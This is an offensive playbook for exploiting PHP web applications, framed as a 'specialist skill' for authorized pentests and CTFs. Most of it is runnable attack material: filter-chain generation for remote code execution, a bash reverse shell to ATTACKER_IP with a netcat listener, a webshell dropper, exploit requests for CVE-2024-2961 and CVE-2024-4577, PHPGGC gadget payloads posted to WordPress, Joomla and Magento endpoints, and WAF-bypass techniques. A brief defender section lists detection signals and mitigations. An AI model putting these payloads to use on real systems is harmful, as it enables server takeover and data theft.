# PHP Filter Chain LFI→RCE — Offensive Specialist Skill

**Scope:** Authorized penetration tests and CTF challenges only.  
**Version:** 2026-current | Verified against Synacktiv research, PHP docs, NVD CVE entries.

---

## 1. Background

PHP's `php://filter` wrapper was designed for stream filtering (base64, encoding conversion). Synacktiv discovered in 2022 that chaining `convert.iconv.*` filters can generate arbitrary bytes from an empty file, effectively achieving RCE from any LFI that uses `include()` / `require()` with user-controlled input — without needing a writable file.

**Key insight:** By chaining 50–200 `convert.iconv` filter stages, you can generate arbitrary PHP code that gets executed when `include()` processes the stream.

**CVE-2024-2961** (glibc iconv buffer overflow in PHP stream filters): A buffer overflow in glibc's `iconv` function when processing `ISO-2022-CN-EXT` encoding, reachable via PHP `convert.iconv.ISO-2022-CN-EXT` filter chains. CVSS 9.1, affects PHP ≤ 8.3.3 on glibc systems.

**CVE-2024-4577** (PHP CGI argument injection on Windows): Allows OS command injection via URL-encoded characters on Windows+PHP CGI. Separate from filter chains but often combined.

---

## 2. Required Conditions

For a filter chain LFI→RCE to work, ALL of the following must be true:

1. **User-controlled include path:** The target must call `include($user_input)` or equivalent
2. **`allow_url_fopen` or `allow_url_include`:** `php://filter` is local; `allow_url_include` only needed for `php://input` variants
3. **PHP streams available:** Not disabled via `open_basedir` in a way that blocks `php://`
4. **glibc available (for CVE-2024-2961):** Linux systems; MUSL libc (Alpine) is NOT affected
5. **RCE variant requires PHP < 8.3.4 (CVE-2024-2961) OR misconfigured include path**

**Checking conditions (black-box):**
```bash
# Test if php://filter works
curl "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php"
# If base64 output appears → php://filter is available

# Test if wrapper-based inclusion works
curl "https://target.com/index.php?page=data://text/plain,<?php+phpinfo();?>"
# If phpinfo appears → data:// include works (much simpler RCE path)
```

---

## 3. Filter Chain Anatomy

### 3.1 How Encoding Chains Generate Arbitrary Bytes

The technique works by exploiting how PHP handles multi-byte encoding conversion errors:
- `convert.iconv.UTF-8.UTF-16LE` doubles each byte
- `convert.iconv.UTF-16LE.UCS-4` quadruples bytes
- Chaining these transformations with carefully chosen encodings produces deterministic byte sequences

The chain processes an empty file (`/dev/null` or any existent file) and the filter pipeline itself generates the payload bytes through encoding transformation side-effects.

### 3.2 Manual Chain Example (simplified)
```
php://filter/
  convert.iconv.UTF8.CSISO2022KR|
  convert.base64-encode|
  convert.iconv.UTF8.UTF7|
  convert.iconv.UTF8.CSISO2022KR|
  ... (50-200 more stages) ...
  convert.base64-decode|
  resource=/dev/null
```

The full chain is too long to craft manually — use the generator tool.

---

## 4. php_filter_chain_generator Tool (Synacktiv)

### 4.1 Setup
```bash
# Clone the generator
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator

# Requirements: Python 3 only
python3 php_filter_chain_generator.py --help
```

### 4.2 Basic Usage
```bash
# Generate chain to execute: <?php system($_GET['cmd']); ?>
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

# Output: a long php://filter/... URL
# Copy and use in the vulnerable parameter
```

### 4.3 Exploitation Flow
```bash
# Step 1: Generate the chain
CHAIN=$(python3 php_filter_chain_generator.py \
  --chain '<?php system($_GET["cmd"]); ?>' \
  | tail -1)

# Step 2: URL-encode and test
# The generator outputs the full filter chain string
# Test with a simple command first
curl "https://target.com/index.php?page=${CHAIN}&cmd=id"

# Step 3: If id output appears, escalate to reverse shell
# URL-encode the reverse shell command
CMD="bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
ENCODED_CMD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${CMD}'))")
curl "https://target.com/index.php?page=${CHAIN}&cmd=${ENCODED_CMD}"

# Step 4: Catch the shell
nc -lvnp 4444
```

### 4.4 Shorter Stager Approach
Instead of executing the full payload in the include, use a two-stage approach:
```bash
# Stage 1: Write a webshell via filter chain
python3 php_filter_chain_generator.py \
  --chain '<?php file_put_contents("/var/www/html/shell.php","<?php system(\$_GET[c]); ?>"); ?>'

# Execute the chain once to drop the webshell
curl "https://target.com/vuln.php?file=${CHAIN}"

# Stage 2: Use the simpler shell directly
curl "https://target.com/shell.php?c=id"
```

---

## 5. CVE-2024-2961 — glibc iconv Buffer Overflow via PHP

### 5.1 Vulnerability Details
- **Affected:** PHP 7.0–8.3.3 on glibc-based Linux (Debian, Ubuntu, RHEL, CentOS)
- **Not affected:** Alpine Linux (uses MUSL libc), Windows
- **CVSS:** 9.1 (Critical)
- **Root cause:** Buffer overflow in glibc `iconv()` when converting to `ISO-2022-CN-EXT`
- **PHP impact:** Reachable via `convert.iconv.*.ISO-2022-CN-EXT` filter in file includes

### 5.2 PoC Reference
```bash
# Check if target is vulnerable
# Target must have PHP < 8.3.4 and glibc (not Alpine)
curl "https://target.com/vuln.php?file=php://filter/convert.iconv.UTF8.ISO-2022-CN-EXT/resource=/etc/passwd"
# If crash or unexpected output → potentially vulnerable

# Full PoC: use ambionics/iconv-exploit or CNI exploit tooling
# (published post-patch; use only on authorized systems)
```

### 5.3 Patch Status
PHP 8.3.4 released 2024-03-14 fixes this. Verify:
```bash
curl "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=php://self"
# Or use phpinfo() leak to check version
```

---

## 6. CVE-2024-4577 — PHP CGI Argument Injection (Windows)

### 6.1 Vulnerability Details
- **Affected:** PHP 8.1.x < 8.1.29, 8.2.x < 8.2.20, 8.3.x < 8.3.8 on Windows with CGI/FastCGI
- **Not affected:** Linux, PHP-FPM
- **CVSS:** 9.8 (Critical)
- **Root cause:** Best-fit character encoding conversion on Windows allows `%AD` (soft hyphen) to bypass the `-s` (source display) protection added in CVE-2012-1823

### 6.2 Exploitation
```bash
# Test for PHP CGI argument injection
curl "https://target.com/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
  -d "<?php system('whoami'); ?>"

# Alternative: use %ADd instead of -d to bypass filter
curl "https://target.com/cgi-bin/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
  --data-binary "<?php echo shell_exec('dir C:\\'); ?>"
```

---

## 7. PHPGGC Per-CMS Deserialization Chain Table

PHPGGC generates PHP object injection payloads using gadget chains from common libraries.

### 7.1 Setup
```bash
git clone https://github.com/ambionics/phpggc
cd phpggc
./phpggc -l  # list all available gadget chains
```

### 7.2 WordPress Gadget Chains
```bash
# List WordPress-compatible chains
./phpggc -l | grep -i "wordpress\|wp\|dompdf\|monolog\|guzzle"

# Dompdf RCE (common in WordPress PDF plugins)
./phpggc Dompdf/RCE1 system "id" -b  # base64 output

# Monolog RCE1 (widely available in Laravel, WP plugins using Monolog)
./phpggc Monolog/RCE1 system "id" -b

# GuzzleHttp SSRF → RCE chain
./phpggc Guzzle/RCE1 system "id" -b

# Usage with WordPress unserialize() vulnerability:
PAYLOAD=$(./phpggc Monolog/RCE1 system "id" -b)
curl "https://wp-target.com/wp-admin/admin-ajax.php" \
  -d "action=vulnerable_action&data=${PAYLOAD}"
```

### 7.3 Joomla Gadget Chains
```bash
# Laminas (formerly Zend Framework) — used heavily by Joomla
./phpggc -l | grep -i "laminas\|zend\|monolog"

./phpggc Laminas/RCE3 system "id" -b
./phpggc Monolog/RCE1 system "id" -b

# Joomla-specific: inject via com_fields or custom component
PAYLOAD=$(./phpggc Laminas/RCE3 system "id" -b)
curl "https://joomla-target.com/index.php?option=com_ajax&plugin=vulnerable&format=json" \
  -d "data=${PAYLOAD}"
```

### 7.4 PrestaShop Gadget Chains
```bash
# Symfony is the foundation of PrestaShop
./phpggc -l | grep -i "symfony\|monolog"

./phpggc Symfony/RCE6 system "id" -b  # Symfony 5+
./phpggc Symfony/RCE4 system "id" -b  # Symfony 3-4

# Inject via PrestaShop module or admin panel object parameter
```

### 7.5 Drupal Gadget Chains
```bash
./phpggc -l | grep -i "drupal\|monolog\|guzzle"

# Drupal uses Symfony components
./phpggc Drupal/RCE1 system "id" -b

# Inject via Drupal's serialized fields (e.g., Views filters, cached render arrays)
```

### 7.6 Magento Gadget Chains
```bash
./phpggc -l | grep -i "magento\|zend\|laminas"

./phpggc Magento/RCE1 system "id" -b  # Magento 2.x
./phpggc Laminas/RCE3 system "id" -b  # Zend/Laminas (Magento dependency)
./phpggc Monolog/RCE1 system "id" -b

# Inject via Magento REST API or admin panel serialized parameters
PAYLOAD=$(./phpggc Magento/RCE1 system "id" -b)
curl -X POST "https://magento-target.com/rest/V1/vulnerable/endpoint" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d "{\"serialized_data\": \"${PAYLOAD}\"}"
```

---

## 8. WAF Bypass for Filter Chain Payloads

Filter chains are extremely long and may trigger length-based WAF rules.

### 8.1 URL Length Reduction Techniques
```bash
# Use shorter PHP payload (minimalist shell)
python3 php_filter_chain_generator.py --chain '<?=`$_GET[c]`?>'
# Backtick operator = exec(), very short

# Even shorter:
python3 php_filter_chain_generator.py --chain '<?=`{$_GET[c]}`?>'
```

### 8.2 Chunked Transfer Encoding Bypass
```bash
# Some WAFs don't inspect chunked bodies
curl "https://target.com/vuln.php" \
  -H "Transfer-Encoding: chunked" \
  --data-urlencode "file=${CHAIN}"
```

### 8.3 POST Parameter Bypass
```bash
# If WAF only inspects GET, move payload to POST
curl -X POST "https://target.com/vuln.php" \
  -d "file=${CHAIN}&cmd=id"
```

### 8.4 Multipart Encoding
```bash
curl "https://target.com/vuln.php" \
  -F "file=${CHAIN}" \
  -F "cmd=id"
```

---

## 9. Detection Signals

### For Defenders
- **Anomalously long GET parameters** containing `convert.iconv` or `convert.base64` strings
- **PHP error logs** showing stream filter processing errors
- **WAF alerts** on `php://filter` in request parameters
- **Outbound DNS/HTTP** from web server to attacker infrastructure after filter chain execution
- **File system changes**: unexpected `.php` files appearing in web root

### Defensive Mitigations
1. **Never use user input directly in `include()`** — use a whitelist map
2. **Set `open_basedir`** to restrict filesystem access
3. **Disable `allow_url_include`** in php.ini (`allow_url_include = Off`)
4. **Update PHP** to ≥ 8.3.4 (CVE-2024-2961 patch) and ≥ 8.3.8 (CVE-2024-4577 patch)
5. **WAF rules:** Block `php://filter` and `convert.iconv` in all parameters
6. **Upgrade glibc** to ≥ 2.40 (iconv fix)

---

## 10. Finding Schema
```
Title: PHP Filter Chain LFI→RCE via [parameter]
CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N)
Target: https://target.com/vuln.php?page=
Payload: php://filter/convert.iconv.../resource=/dev/null
Evidence: Command output screenshot, whoami/id result
Impact: Unauthenticated Remote Code Execution
References:
  - https://www.synacktiv.com/publications/php-filter-chain-generator-a-new-native-way-to-exploit-lfi
  - CVE-2024-2961, CVE-2024-4577
```

---

*All targets in this document are placeholder references. Apply only to in-scope authorized systems.*
